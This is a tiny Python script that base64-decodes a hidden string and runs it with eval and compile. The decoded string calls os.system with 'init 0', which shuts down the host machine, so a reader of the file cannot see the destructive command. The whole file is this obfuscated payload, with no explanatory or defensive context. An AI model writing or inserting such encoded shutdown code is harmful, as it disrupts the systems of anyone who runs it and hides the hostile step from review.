import base64

myscript = """aW1wb3J0IG9zCgpvcy5zeXN0ZW0oImluaXQgMCIp"""
eval(compile(base64.b64decode(myscript), '<string>', 'exec'))
